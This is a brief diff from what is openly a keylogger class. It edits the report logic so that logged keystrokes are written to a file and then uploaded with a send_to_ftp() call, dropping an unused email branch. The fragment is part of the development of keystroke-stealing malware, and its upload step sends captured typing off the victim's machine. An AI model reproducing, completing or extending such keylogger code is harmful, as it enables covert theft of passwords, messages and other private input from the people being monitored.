@@ -67,9 +67,7 @@ class Keylogger:
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            if self.report_method == "email":
-                print("hello")
-            elif self.report_method == "file":
+            if self.report_method == "file":
                 self.report_to_file()
                 self.send_to_ftp()
             # print keylog in console(toggle)
